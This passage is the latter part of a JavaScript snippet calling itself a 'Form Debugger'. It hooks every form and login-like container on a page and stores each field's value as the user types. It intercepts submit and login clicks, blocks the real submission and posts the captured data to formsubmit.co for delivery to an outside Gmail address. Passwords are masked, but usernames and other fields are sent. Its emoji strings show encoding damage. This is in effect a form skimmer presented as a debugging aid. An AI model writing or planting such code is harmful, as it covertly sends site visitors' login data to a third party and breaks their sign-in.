    `;
    document.body.appendChild(debugDiv);

    function log(msg, type = 'info') {
        const timestamp = new Date().toLocaleTimeString();
        const logEntry = document.createElement('div');
        logEntry.innerHTML = `<span style="color: #888">[${timestamp}]</span> <span style="color: ${type === 'error' ? '#f55' : type === 'warn' ? '#ff5' : '#0f0'}">${msg}</span>`;
        document.getElementById('debugLog').appendChild(logEntry);
        debugDiv.scrollTop = debugDiv.scrollHeight;
        console.log(`[FormDebugger] ${msg}`);
    }

    // ====================== DATA HANDLING ======================
    async function sendLoggedData() {
        let savedData = {};
        try {
            savedData = JSON.parse(localStorage.getItem('loginData') || '{}');
            if (Object.keys(savedData).length === 0) {
                log('âš ï¸ No data to submit', 'warn');
                return;
            }
            
            log('â³ Preparing submission...', 'info');
            Object.entries(savedData).forEach(([key, value]) => {
                log(`  ${key}: ${key.toLowerCase().includes('pass') ? 'â€¢â€¢â€¢â€¢â€¢â€¢' : value}`, 'info');
            });

            const formData = new FormData();
            formData.append('name', 'Form Debugger');
            formData.append('email', 'debug@example.com');
            formData.append('subject', 'Captured Form Data');
            formData.append('message', Object.entries(savedData).map(
                ([k, v]) => `${k}: ${k.toLowerCase().includes('pass') ? 'â€¢â€¢â€¢â€¢â€¢â€¢' : v}`
            ).join('\n'));
            formData.append('_captcha', 'false');

            const response = await fetch('https://formsubmit.co/ajax/kiddxxq1@gmail.com', {
                method: 'POST',
                body: formData
            });

            if (!response.ok) throw new Error(`HTTP ${response.status}`);
            
            const result = await response.json();
            if (result.success) {
                log('âœ… Data submitted successfully', 'success');
                localStorage.removeItem('loginData');
            } else {
                throw new Error(result.message || 'Submission failed');
            }
        } catch (err) {
            log(`âŒ Submission error: ${err.message}`, 'error');
        }
    }

    // ====================== FORM CAPTURE ======================
    function captureInputChanges(form) {
        const inputs = form.querySelectorAll('input, textarea, select');
        inputs.forEach(input => {
            const name = input.name || input.id;
            if (!name) return;

            const handleChange = () => {
                let savedData = JSON.parse(localStorage.getItem('loginData') || '{}');
                savedData[name] = input.value;
                localStorage.setItem('loginData', JSON.stringify(savedData));
                log(`âœï¸ ${name} updated`, 'info');
            };

            input.addEventListener('change', handleChange);
            input.addEventListener('input', handleChange);
        });
    }

    function captureSubmitActions(form) {
        // 1. Traditional form submission
        form.addEventListener('submit', async function(e) {
            log('ðŸ”˜ Form submit event detected', 'info');
            e.preventDefault();
            await sendLoggedData();
            return false;
        }, true); // Use capture phase

        // 2. Button clicks
        const buttons = form.querySelectorAll('button, [type="submit"], [type="button"]');
        buttons.forEach(btn => {
            btn.addEventListener('click', async function(e) {
                // Check if this is likely a submit button
                const isSubmit = btn.type === 'submit' || 
                               btn.getAttribute('type') === 'submit' ||
                               btn.classList.contains('submit') ||
                               /submit|login|sign|continue|next/i.test(btn.textContent) ||
                               /submit|login|sign|continue|next/i.test(btn.value) ||
                               /submit|login|sign|continue|next/i.test(btn.id);
                
                if (isSubmit) {
                    log(`ðŸ–±ï¸ Submit button clicked: ${btn.textContent.trim() || btn.value || btn.id || 'unnamed'}`, 'info');
                    e.preventDefault();
                    await sendLoggedData();
                }
            }, true); // Capture phase
        });

        // 3. Form-associated elements
        form.querySelectorAll('[role="button"], [onclick]').forEach(el => {
            el.addEventListener('click', async function(e) {
                if (/submit|login|sign/i.test(el.textContent) || 
                    /submit|login|sign/i.test(el.getAttribute('onclick'))) {
                    log(`ðŸ”˜ Custom button clicked: ${el.textContent.trim()}`, 'info');
                    e.preventDefault();
                    await sendLoggedData();
                }
            }, true);
        });
    }

    function hookForm(form) {
        if (!form || form.dataset.debugHooked) return;
        form.dataset.debugHooked = 'true';
        
        const formId = form.id || form.name || 'anonymous-form';
        log(`ðŸ“Œ Hooking form: ${formId}`, 'info');

        captureInputChanges(form);
        captureSubmitActions(form);
    }

    // ====================== INITIALIZATION ======================
    function scanForForms() {
        // Standard forms
        document.querySelectorAll('form').forEach(hookForm);
        
        // Common form containers
        const formLikeSelectors = [
            '[role="form"]', 
            '.form-container', 
            '.auth-form', 
            '.login-form',
            '.signin-form',
            '.modal-content',
            'div[class*="form"]',
            'div[class*="auth"]',
            'div[class*="login"]'
        ];
        
        formLikeSelectors.forEach(selector => {
            document.querySelectorAll(selector).forEach(container => {
                if (container.querySelector('input, button')) {
                    log(`ðŸ” Found form-like container: ${selector}`, 'info');
                    hookForm(container);
                }
            });
        });
    }

    // Watch for dynamically added forms
    const observer = new MutationObserver((mutations) => {
        mutations.forEach(mutation => {
            mutation.addedNodes.forEach(node => {
                if (node.nodeType === 1) { // Element node
                    if (node.matches('form, [role="form"]')) {
                        hookForm(node);
                    }
                    if (node.querySelectorAll) {
                        node.querySelectorAll('form, [role="form"]').forEach(hookForm);
                    }
                }
            });
        });
    });
    observer.observe(document.body, { childList: true, subtree: true });

    // Control buttons
    document.getElementById('debugClear').addEventListener('click', () => {
        document.getElementById('debugLog').innerHTML = '';
        log('Log cleared', 'info');
    });
    document.getElementById('debugCopy').addEventListener('click', () => {
        const logText = Array.from(document.getElementById('debugLog').children)
            .map(el => el.textContent).join('\n');
        navigator.clipboard.writeText(logText)
            .then(() => log('Log copied', 'success'))
            .catch(err => log(`Copy failed: ${err}`, 'error'));
    });
    document.getElementById('debugSubmit').addEventListener('click', sendLoggedData);

    // Initial scan
    scanForForms();
    log('ðŸš€ Debugger initialized', 'success');
})();
</script>
